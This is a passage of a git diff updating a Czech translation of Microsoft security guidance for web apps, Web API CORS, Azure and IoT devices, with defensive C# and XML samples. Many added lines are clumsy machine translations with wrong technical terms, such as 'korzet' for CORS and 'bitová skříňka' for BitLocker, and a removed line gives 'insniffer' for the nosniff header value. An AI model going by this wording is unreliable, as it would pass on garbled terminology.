+| **Kroky** | <p>Vývojáři používající standardní javascriptové knihovny, jako je JQuery, musí používat schválené verze běžných javascriptových knihoven, které neobsahují známé bezpečnostní chyby. Osvědčeným postupem je použití nejnovější verze knihoven, protože obsahují opravy zabezpečení známých chyb zabezpečení ve starších verzích.</p><p>Pokud nejnovější verzi nelze použít z důvodů kompatibility, měly by být použity níže uvedené minimální verze.</p><p>Přijatelné minimální verze:</p><ul><li>**Jquery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery Ověřit 1,9</li><li>JQuery Mobile 1.0.1</li><li>Cyklus JQuery 2,99</li><li>JQuery Datové tabulky 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Sada řídicích nástrojů Ajax 40412</li></ul></li><li>**ASP.NET webové formuláře a Ajax**<ul><li>Webové formuláře ASP.NET a Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nikdy nenačítat žádnou knihovnu JavaScriptu z externích webů, jako jsou veřejné sítě CDN</p>|
 
-## <a id="mime-sniff"></a>Zakázat automatické sledování dat v kódování MIME
+## <a name="disable-automatic-mime-sniffing"></a><a id="mime-sniff"></a>Zakázat automatické čichání MIME
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [IE8 Security Part V: komplexní ochrana](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [typ MIME](https://en.wikipedia.org/wiki/Mime_type) |
-| **Kroky** | Hlavička X-Content-Type-Options je hlavička protokolu HTTP, která vývojářům umožňuje určit, že jejich obsah by neměl být ve formátu MIME. Tato hlavička je navržená tak, aby zmírnila útoky využívající kódování MIME. Pro každou stránku, která by mohla obsahovat uživatelsky ovladatelné obsahy, je nutné použít záhlaví HTTP X-Content-Type-Options: insniffer. Pokud chcete povinnou hlavičku globálně povolit pro všechny stránky v aplikaci, můžete provést jednu z následujících akcí:|
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [IE8 Bezpečnostní část V: Komplexní ochrana](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [typ MIME](https://en.wikipedia.org/wiki/Mime_type) |
+| **Kroky** | Hlavička X-Content-Type-Options je hlavička HTTP, která vývojářům umožňuje určit, že jejich obsah by neměl být mime-sniffed. Tato hlavička je určena ke zmírnění útoků MIME-sniffing. Pro každou stránku, která by mohla obsahovat uživatelsky kontrolovatelný obsah, musíte použít hlavičku HTTP X-Content-Type-Options:nosniff. Chcete-li povolit požadované záhlaví globálně pro všechny stránky v aplikaci, můžete provést jednu z následujících akcí|
 
 ### <a name="example"></a>Příklad
-Pokud je aplikace hostována službou Internetová informační služba (IIS) 7 a vyšší, přidejte do souboru Web. config hlavičku. 
+Pokud je aplikace hostována službou InternetOvou informační službou (IIS) 7, přidejte záhlaví do souboru web.config. 
 ```XML
 <system.webServer>
 <httpProtocol>
@@ -228,7 +228,7 @@ Pokud je aplikace hostována službou Internetová informační služba (IIS) 7 
 ```
 
 ### <a name="example"></a>Příklad
-Přidat hlavičku pomocí globální aplikace\_BeginRequest 
+Přidání záhlaví prostřednictvím\_globálního požadavku BeginRequest aplikace 
 ```csharp
 void Application_BeginRequest(object sender, EventArgs e)
 {
@@ -263,47 +263,47 @@ application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
 ```
 
 ### <a name="example"></a>Příklad
-Požadovanou hlavičku můžete povolit jenom pro konkrétní stránky tak, že ji přidáte do jednotlivých odpovědí: 
+Požadované záhlaví můžete povolit pouze pro určité stránky přidáním jednotlivých odpovědí: 
 
 ```csharp
 this.Response.Headers["X-Content-Type-Options"] = "nosniff";
 ```
 
-## <a id="standard-finger"></a>Odebrání standardních hlaviček serveru na webech Windows Azure, aby nedocházelo k otiskům prstů
+## <a name="remove-standard-server-headers-on-windows-azure-web-sites-to-avoid-fingerprinting"></a><a id="standard-finger"></a>Odebrání standardních záhlaví serverů na webech Windows Azure, abyste zabránili snímání otisků prstů
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Webová aplikace | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | EnvironmentType – Azure |
-| **Odkazy**              | [Odebrání standardních hlaviček serveru na webech Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
-| **Kroky** | Hlavičky, jako je server, X-s, x-AspNet-Version, odhalují informace o serveru a základních technologiích. Doporučuje se potlačit tato záhlaví a zabránit tak otisku prstu aplikace. |
+| **Atributy**              | EnvironmentType – Azure |
+| **Odkazy**              | [Odebrání standardních záhlaví serverů na webech Windows Azure](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
+| **Kroky** | Záhlaví jako Server, X-Powered-By, X-AspNet-Version odhalují informace o serveru a základních technologiích. Doporučuje se potlačit tyto hlavičky, čímž se zabrání snímání otisků prstů aplikace |
 
-## <a id="firewall-db"></a>Konfigurace brány Windows Firewall pro přístup k databázovému stroji
+## <a name="configure-a-windows-firewall-for-database-engine-access"></a><a id="firewall-db"></a>Konfigurace brány Windows Firewall pro přístup k databázovému stroji
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
-| **Komponenta**               | databáze | 
+| **Komponenta**               | Databáze | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | SQL Azure, OnPrem |
-| **Atribut**              | N/A, verze SQL – V12 |
-| **Odkazy**              | [Jak nakonfigurovat bránu firewall služby Azure SQL Database](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [nakonfigurovat bránu Windows Firewall pro přístup k databázovému stroji](https://msdn.microsoft.com/library/ms175043) |
-| **Kroky** | Systémy brány firewall zabraňují neoprávněnému přístupu k prostředkům počítače. Pokud chcete získat přístup k instanci databázového stroje SQL Server přes bránu firewall, musíte bránu firewall nakonfigurovat na počítači, na kterém běží SQL Server, aby se povolil přístup. |
+| **Atributy**              | Není k mna, VERZE SQL - V12 |
+| **Odkazy**              | [Konfigurace brány firewall databáze Azure SQL](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), Konfigurace brány Windows Firewall pro přístup k [databázovému stroji](https://msdn.microsoft.com/library/ms175043) |
+| **Kroky** | Firewallové systémy zabraňují neoprávněnému přístupu k počítačovým prostředkům. Chcete-li získat přístup k instanci databázového stroje serveru SQL Server prostřednictvím brány firewall, je nutné nakonfigurovat bránu firewall v počítači se systémem SQL Server, aby byl přístup povolen |
 
-## <a id="cors-api"></a>Ujistěte se, že je povolený jenom důvěryhodný původ, pokud je v rozhraní Web API pro ASP.NET povolené CORS.
+## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-aspnet-web-api"></a><a id="cors-api"></a>Ujistěte se, že jsou povoleny pouze důvěryhodné počátky, pokud je v ASP.NET webovém rozhraní API povolen a korzet
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Web API | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | MVC 5 |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [Povolení žádostí o více zdrojů v ASP.NET webovém rozhraní API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API – CORS podpora v ASP.NET webovém rozhraní API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
-| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásady stejného původu a brání škodlivému webu v čtení citlivých dat z jiné lokality. V některých případech ale může být nutné vystavit rozhraní API bezpečně, které ostatní weby mohou spotřebovat. Sdílení prostředků mezi zdroji (CORS) je standard W3C, který umožňuje serveru zmírnit zásady stejného zdroje.</p><p>Při použití CORS může server explicitně umožnit některé žádosti o více zdrojů a současně odmítat jiné. CORS je bezpečnější a pružnější než u předchozích technik, jako je JSONP.</p>|
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [Povolení požadavků na příčné počátky v rozhraní ASP.NET Web API 2](https://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), ASP.NET web API – podpora [CORS v ASP.NET web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
+| **Kroky** | <p>Zabezpečení prohlížečů brání webovým stránkám v odesílání požadavků AJAX na jinou doménu. Toto omezení se nazývá zásady stejného původu a zabraňuje škodlivému webu ve čtení citlivých dat z jiného webu. Někdy však může být nutné bezpečně vystavit api, která jiné weby mohou využívat. Cross Origin Resource Sharing (CORS) je standard W3C, který umožňuje serveru uvolnit zásady stejného původu.</p><p>Pomocí CORS server může explicitně povolit některé požadavky napříč původy při odmítnutí jiných. CORS je bezpečnější a flexibilnější než předchozí techniky, jako je JSONP.</p>|
 
 ### <a name="example"></a>Příklad
-Do App_Start/WebApiConfig.cs přidejte následující kód do metody WebApiConfig. Register 
+V souboru App_Start/WebApiConfig.cs přidejte do metody WebApiConfig.Register následující kód 
 ```csharp
 using System.Web.Http;
 namespace WebService
@@ -326,7 +326,7 @@ namespace WebService
 ```
 
 ### <a name="example"></a>Příklad
-Atribut EnableCors lze použít na metody akcí v řadiči následujícím způsobem: 
+Atribut EnableCors lze použít na metody akce v kontroleru následujícím způsobem: 
 
 ```csharp
 public class ResourcesController : ApiController
@@ -364,10 +364,10 @@ public class ResourcesController : ApiController
 }
 ```
 
-Všimněte si, že je důležité zajistit, aby byl seznam původcích v atributu EnableCors nastaven na konečnou a důvěryhodnou sadu zdrojů. Nepatřičná konfigurace (např. nastavení hodnoty *) umožní škodlivým webům aktivovat požadavky mezi zdroji na rozhraní API bez jakýchkoli omezení, > tak, aby rozhraní API mohlo být zranitelné vůči útokům CSRF. EnableCors je možné dekorovat na úrovni řadiče. 
+Vezměte prosím na vědomí, že je důležité zajistit, aby seznam počátků v EnableCors atribut je nastaven na omezenou a důvěryhodnou sadu počátků. Pokud to nenakonfigurujete nevhodně (např. nastavení hodnoty jako *), umožní škodlivé weby aktivovat požadavky na příčný původ do rozhraní API bez jakýchkoli omezení, >čímž se rozhraní API stane zranitelným vůči útokům CSRF. EnableCors lze dekorovat na úrovni řadiče. 
 
 ### <a name="example"></a>Příklad
-Chcete-li zakázat CORS pro konkrétní metodu ve třídě, lze použít atribut DisableCors, jak je znázorněno níže: 
+Chcete-li zakázat CORS na konkrétní metodu ve třídě, DisableCors atribut lze použít, jak je znázorněno níže: 
 ```csharp
 [EnableCors("https://example.com", "Accept, Origin, Content-Type", "POST")]
 public class ResourcesController : ApiController
@@ -389,19 +389,19 @@ public class ResourcesController : ApiController
 }
 ```
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Web API | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | MVC 6 |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [Povolení žádostí mezi zdroji (CORS) v ASP.NET Core 1,0](https://docs.asp.net/en/latest/security/cors.html) |
-| **Kroky** | <p>V ASP.NET Core 1,0 lze CORS povolit buď pomocí middlewaru, nebo pomocí MVC. Při použití MVC k povolení CORS se používají stejné služby CORS, ale middleware CORS není.</p>|
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [Povolení požadavků na příčný původ (CORS) v ASP.NET jádra 1.0](https://docs.asp.net/en/latest/security/cors.html) |
+| **Kroky** | <p>V ASP.NET Core 1.0, CORS může být povolena buď pomocí middleware nebo pomocí MVC. Při použití MVC povolit CORS stejné cors služby jsou používány, ale cors middleware není.</p>|
 
-**Přístup – 1** Povolení CORS s middlewarem: Pokud chcete povolit CORS pro celou aplikaci, přidejte do kanálu požadavků middleware CORS pomocí metody rozšíření UseCors. Pokud přidáte middleware CORS pomocí třídy CorsPolicyBuilder, můžete zadat zásady pro více zdrojů. Chcete-li to provést dvěma způsoby:
+**Přiblížení-1** Povolení CORS s middleware: Chcete-li povolit CORS pro celou aplikaci, přidejte middleware CORS do kanálu požadavků pomocí metody rozšíření UseCors. Zásady křížového původu lze zadat při přidávání middleware CORS pomocí Třídy CorsPolicyBuilder. Toto lze provést dvěma způsoby:
 
 ### <a name="example"></a>Příklad
-První je volat UseCors pomocí lambda. Lambda převezme objekt CorsPolicyBuilder: 
+První je zavolat UseCors s lambdou. Lambda trvá CorsPolicyBuilder objekt: 
 ```csharp
 public void Configure(IApplicationBuilder app)
 {
@@ -413,7 +413,7 @@ public void Configure(IApplicationBuilder app)
 ```
 
 ### <a name="example"></a>Příklad
-Druhým je definovat jednu nebo více pojmenovaných zásad CORS a pak vybrat zásadu podle názvu v době běhu. 
+Druhým je definovat jednu nebo více pojmenovaných zásad CORS a potom vyberte zásadu podle názvu za běhu. 
 ```csharp
 public void ConfigureServices(IServiceCollection services)
 {
@@ -433,10 +433,10 @@ public void Configure(IApplicationBuilder app)
 }
 ```
 
-**Přístup 2** Povolení CORS v MVC: vývojáři můžou alternativně použít MVC k aplikování konkrétní CORS na akci, na kontroler nebo globálně pro všechny řadiče.
+**Přístup-2** Povolení CORS v MVC: Vývojáři mohou alternativně použít MVC použít konkrétní CORS na akci, na řadič, nebo globálně pro všechny řadiče.
 
 ### <a name="example"></a>Příklad
-Na akci: Chcete-li zadat zásadu CORS pro konkrétní akci, přidejte k akci atribut [EnableCors]. Zadejte název zásady. 
+Pro akci: Chcete-li zadat zásadu CORS pro konkrétní akci, přidejte atribut [EnableCors] do akce. Zadejte název zásady. 
 ```csharp
 public class HomeController : Controller
 {
@@ -448,7 +448,7 @@ public class HomeController : Controller
 ```
 
 ### <a name="example"></a>Příklad
-Na jeden kontroler: 
+Na regulátor: 
 ```csharp
 [EnableCors("AllowSpecificOrigin")]
 public class HomeController : Controller
@@ -456,7 +456,7 @@ public class HomeController : Controller
 ```
 
 ### <a name="example"></a>Příklad
-Univerzál 
+Globálně: 
 ```csharp
 public void ConfigureServices(IServiceCollection services)
 {
@@ -467,10 +467,10 @@ public void ConfigureServices(IServiceCollection services)
     });
 }
 ```
-Všimněte si, že je důležité zajistit, aby byl seznam původcích v atributu EnableCors nastaven na konečnou a důvěryhodnou sadu zdrojů. Nepatřičná konfigurace (např. nastavení hodnoty *) umožní škodlivým webům aktivovat požadavky mezi zdroji na rozhraní API bez jakýchkoli omezení, > tak, aby rozhraní API mohlo být zranitelné vůči útokům CSRF. 
+Vezměte prosím na vědomí, že je důležité zajistit, aby seznam počátků v EnableCors atribut je nastaven na omezenou a důvěryhodnou sadu počátků. Pokud to nenakonfigurujete nevhodně (např. nastavení hodnoty jako *), umožní škodlivé weby aktivovat požadavky na příčný původ do rozhraní API bez jakýchkoli omezení, >čímž se rozhraní API stane zranitelným vůči útokům CSRF. 
 
 ### <a name="example"></a>Příklad
-Chcete-li zakázat CORS pro kontroler nebo akci, použijte atribut [DisableCors]. 
+Chcete-li zakázat cors pro řadič nebo akci, použijte atribut [DisableCors]. 
 ```csharp
 [DisableCors]
     public IActionResult About()
@@ -479,137 +479,137 @@ Chcete-li zakázat CORS pro kontroler nebo akci, použijte atribut [DisableCors]
     }
 ```
 
-## <a id="config-sensitive"></a>Šifrovat oddíly konfiguračních souborů webového rozhraní API, které obsahují citlivá data
+## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Šifrování částí konfiguračních souborů webového rozhraní API, které obsahují citlivá data
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Web API | 
 | **Fáze SDL**               | Nasazení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [Postupy: šifrování konfiguračních oddílů v ASP.NET 2,0 pomocí DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [určení poskytovatele chráněné konfigurace](https://msdn.microsoft.com/library/68ze1hb2.aspx) [pomocí Azure Key Vault k ochraně tajných klíčů aplikací](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
-| **Kroky** | Konfigurační soubory, jako je soubor Web. config, appSettings. JSON, se často používají k ukládání citlivých informací, včetně uživatelských jmen, hesel, připojovacích řetězců databáze a šifrovacích klíčů. Pokud tyto informace nechráníte, je vaše aplikace zranitelná vůči útočníkům nebo zlomyslným uživatelům, kteří získají citlivé informace, jako jsou uživatelská jména a hesla pro účty, názvy databází a názvy serverů. V závislosti na typu nasazení (Azure/on-Prem) Šifrujte citlivé oddíly konfiguračních souborů pomocí DPAPI nebo služeb, jako je Azure Key Vault. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [Postup: Šifrování oddílů konfigurace v ASP.NET 2.0 pomocí dpapi](https://msdn.microsoft.com/library/ff647398.aspx), [určení zprostředkovatele chráněné konfigurace](https://msdn.microsoft.com/library/68ze1hb2.aspx), použití [trezoru klíčů Azure k ochraně tajných kódů aplikací](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
+| **Kroky** | Konfigurační soubory, jako je například web.config, appsettings.json se často používají k uložení citlivých informací, včetně uživatelských jmen, hesel, připojovacích řetězců databáze a šifrovacích klíčů. Pokud tyto informace nezaštítíte, je aplikace ohrožena útočníky nebo uživateli se zlými úmysly, kteří zpřístupňují citlivé informace, jako jsou uživatelská jména a hesla účtu, názvy databází a názvy serverů. Na základě typu nasazení (azure/on-prem) zašifrujte citlivé části konfiguračních souborů pomocí DPAPI nebo služeb, jako je Azure Key Vault. |
 
-## <a id="admin-strong"></a>Ujistěte se, že všechna rozhraní správce jsou zabezpečená pomocí silných přihlašovacích údajů.
+## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Ujistěte se, že všechna rozhraní pro správu jsou zabezpečena silnými přihlašovacími údaji
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Zařízení IoT | 
 | **Fáze SDL**               | Nasazení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | neuvedeno  |
-| **Kroky** | Všechna rozhraní pro správu, která zpřístupňuje brána zařízení nebo pole, by měla být zabezpečená pomocí silných přihlašovacích údajů. Všechna další vystavená rozhraní, jako je Wi-Fi, SSH, sdílené složky, by měla být zabezpečená pomocí silných přihlašovacích údajů. Výchozí slabá hesla by se neměla používat. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | Není dostupné.  |
+| **Kroky** | Všechna rozhraní pro správu, která zařízení nebo brána pole zveřejňuje by měla být zabezpečena pomocí silných pověření. Také jakékoli jiné exponované rozhraní, jako je WiFi, SSH, sdílení souborů, FTP by měly být zabezpečeny silnými pověřeními. Výchozí slabá hesla by neměla být používána. |
 
-## <a id="unknown-exe"></a>Zajistěte, aby na zařízeních nebyl spuštěn neznámý kód.
+## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Ujistěte se, že neznámý kód nelze spustit na zařízeních
 
-| Název                   | Podrobnosti      |
-| ----------------------- | ------------ |
-| **Komponenta**               | Zařízení IoT | 
-| **Fáze SDL**               | Sestavení |  
-| **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | [Povolení zabezpečeného spouštění a šifrování zařízení bitových zámků ve Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
-| **Kroky** | Zabezpečené spouštění UEFI omezuje systém tak, aby povoloval jenom spouštění binárních souborů podepsaných konkrétní autoritou. Tato funkce brání spuštění neznámého kódu na platformě a potenciálně oslabení stav zabezpečení. Povolte zabezpečené spouštění UEFI a omezte seznam certifikačních autorit, které jsou důvěryhodné pro podpisový kód. Podepište veškerý kód, který je nasazený na zařízení pomocí jedné z důvěryhodných autorit. |
-
-## <a id="partition-iot"></a>Zašifrujte operační systém a další oddíly zařízení IoT pomocí bitových zámků.
-
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Zařízení IoT | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | neuvedeno  |
-| **Kroky** | Windows 10 IoT Core implementuje zjednodušenou verzi šifrování zařízení s bitovým zámkem, která má silnou závislost na přítomnosti čipu TPM na platformě, včetně nezbytného protokolu preOS v rozhraní UEFI, který provádí nezbytná měření. Tato měření preOS zajišťují, že operační systém později má konečný záznam o tom, jak byl operační systém spuštěn. Zašifrujte oddíly operačního systému pomocí bitových zámků a dalších oddílů pro případ, že ukládají citlivá data. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | [Povolení zabezpečeného spouštění a šifrování zařízení s bitovou skříňkou ve Windows 10 IoT Core](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
+| **Kroky** | Zabezpečené spuštění uEFI omezuje systém tak, aby umožňoval pouze provádění binárních souborů podepsaných zadanou autoritou. Tato funkce zabraňuje spuštění neznámého kódu na platformě a potenciálně oslabuje jeho stav zabezpečení. Povolte zabezpečené spouštění UEFI a omezte seznam certifikačních autorit, které jsou důvěryhodné pro podepisování kódu. Podepište veškerý kód nasazený v zařízení pomocí jednoho z důvěryhodných autorit. |
 
-## <a id="min-enable"></a>Zajistěte, aby na zařízeních byly povolené jenom minimální služby a funkce.
+## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>Šifrování operačního systému a dalšíoddíly zařízení IoT pomocí bitové skříňky
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
+| ----------------------- | ------------ |
+| **Komponenta**               | Zařízení IoT | 
+| **Fáze SDL**               | Sestavení |  
+| **Použitelné technologie** | Obecné |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | Není dostupné.  |
+| **Kroky** | Windows 10 IoT Core implementuje odlehčenou verzi bit-locker device encryption, která má silnou závislost na přítomnosti čipu TPM na platformě, včetně nezbytného protokolu preOS v UEFI, který provádí potřebná měření. Tato měření preOS zajišťují, že operační systém má později konečný záznam o tom, jak byl operační systém spuštěn. Šifrujte oddíly operačního systému pomocí bit-locker a další oddíly i v případě, že ukládají citlivá data. |
+
+## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Ujistěte se, že jsou na zařízeních povoleny pouze minimální služby/funkce.
+
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Zařízení IoT | 
 | **Fáze SDL**               | Nasazení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | neuvedeno  |
-| **Kroky** | Nepovolujte ani nepínejte žádné funkce nebo služby v operačním systému, které nejsou pro fungování řešení vyžadovány. Například pokud zařízení nevyžaduje nasazení uživatelského rozhraní, nainstalujte systém Windows IoT Core v režimu bezobslužné instalace. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | Není dostupné.  |
+| **Kroky** | Nepovolujte ani nevypínejte žádné funkce nebo služby v os, které nejsou vyžadovány pro fungování řešení. Pokud například zařízení nevyžaduje nasazení ui, nainstalujte windows IoT Core v bezhlavém režimu. |
 
-## <a id="field-bit-locker"></a>Zašifrujte operační systém a další oddíly brány pole IoT pomocí bitových zámků.
+## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>Šifrování operačního systému a dalšíoddíly brány IoT Field Gateway pomocí bitové skříňky
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
-| **Komponenta**               | Brána pole IoT | 
+| **Komponenta**               | Brána ioT pole | 
 | **Fáze SDL**               | Nasazení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | neuvedeno  |
-| **Kroky** | Windows 10 IoT Core implementuje zjednodušenou verzi šifrování zařízení s bitovým zámkem, která má silnou závislost na přítomnosti čipu TPM na platformě, včetně nezbytného protokolu preOS v rozhraní UEFI, který provádí nezbytná měření. Tato měření preOS zajišťují, že operační systém později má konečný záznam o tom, jak byl operační systém spuštěn. Zašifrujte oddíly operačního systému pomocí bitových zámků a dalších oddílů pro případ, že ukládají citlivá data. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | Není dostupné.  |
+| **Kroky** | Windows 10 IoT Core implementuje odlehčenou verzi bit-locker device encryption, která má silnou závislost na přítomnosti čipu TPM na platformě, včetně nezbytného protokolu preOS v UEFI, který provádí potřebná měření. Tato měření preOS zajišťují, že operační systém má později konečný záznam o tom, jak byl operační systém spuštěn. Šifrujte oddíly operačního systému pomocí bit-locker a další oddíly i v případě, že ukládají citlivá data. |
 
-## <a id="default-change"></a>Ujistěte se, že výchozí přihlašovací údaje brány pole jsou během instalace změněny.
+## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Ujistěte se, že se během instalace změní výchozí přihlašovací údaje brány pole.
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
-| **Komponenta**               | Brána pole IoT | 
+| **Komponenta**               | Brána ioT pole | 
 | **Fáze SDL**               | Nasazení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | neuvedeno  |
-| **Kroky** | Ujistěte se, že výchozí přihlašovací údaje brány pole jsou během instalace změněny. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | Není dostupné.  |
+| **Kroky** | Ujistěte se, že se během instalace změní výchozí přihlašovací údaje brány pole. |
 
-## <a id="cloud-firmware"></a>Zajistěte, aby cloudová brána implementovala proces, který zachová firmware připojených zařízení v aktuálním stavu.
+## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Ujistěte se, že cloudová brána implementuje proces, který udržuje firmware připojených zařízení v aktuálním stavu.
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
-| **Komponenta**               | IoT Cloud Gateway | 
+| **Komponenta**               | Cloudová brána IoT | 
 | **Fáze SDL**               | Sestavení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | Volba brány – Azure IoT Hub |
-| **Odkazy**              | [Přehled správy zařízení IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [jak aktualizovat firmware zařízení](../../iot-hub/tutorial-firmware-update.md) |
-| **Kroky** | LWM2M je protokol od Open Mobile Alliance pro správu zařízení IoT. Správa zařízení ve službě Azure IoT umožňuje pracovat s fyzickými zařízeními pomocí úloh zařízení. Zajistěte, aby cloudová brána implementovala proces pro rutinu, která pravidelně udržuje zařízení a další konfigurační data v aktuálním stavu pomocí správy zařízení Azure IoT Hub. |
+| **Atributy**              | Volba brány – Azure IoT Hub |
+| **Odkazy**              | [Přehled správy zařízení služby IoT Hub](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [Jak aktualizovat firmware zařízení](../../iot-hub/tutorial-firmware-update.md) |
+| **Kroky** | LWM2M je protokol od Open Mobile Alliance pro správu ioT zařízení. Správa zařízení Azure IoT umožňuje interakci s fyzickými zařízeními pomocí úloh zařízení. Ujistěte se, že cloudová brána implementuje proces, který běžně udržuje data zařízení a další konfigurace aktuální pomocí správy zařízení Azure IoT Hub. |
 
-## <a id="controls-policies"></a>Ujistěte se, že zařízení mají ovládací prvky zabezpečení koncového bodu nakonfigurované podle zásad pro organizace.
+## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Ujistěte se, že zařízení mají ovládací prvky zabezpečení koncového bodu nakonfigurované podle zásad organizace
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Hranice důvěryhodnosti počítače | 
 | **Fáze SDL**               | Nasazení |  
 | **Použitelné technologie** | Obecné |
-| **Atribut**              | neuvedeno  |
-| **Odkazy**              | neuvedeno  |
-| **Kroky** | Zajistěte, aby zařízení měla ovládací prvky zabezpečení koncového bodu, jako je například rozšíření bitového zámku pro šifrování na úrovni disku, antivirový program s aktualizovanými podpisy, brány firewall na bázi hostitele, upgrady operačního systému, zásady skupiny atd., se konfigurují podle zásad zabezpečení organizace. |
+| **Atributy**              | Není dostupné.  |
+| **Odkazy**              | Není dostupné.  |
+| **Kroky** | Ujistěte se, že zařízení mají ovládací prvky zabezpečení koncového bodu, jako je bitová skříňka pro šifrování na úrovni disku, antivirová ochrana s aktualizovanými podpisy, brána firewall založená na hostiteli, upgrady operačního systému, zásady skupiny atd. |
 
-## <a id="secure-keys"></a>Zajistěte zabezpečenou správu přístupových klíčů Azure Storage.
+## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Zajištění zabezpečené správy přístupových klíčů úložiště Azure
 
-| Název                   | Podrobnosti      |
+| Nadpis                   | Podrobnosti      |
 | ----------------------- | ------------ |
 | **Komponenta**               | Azure Storage | 
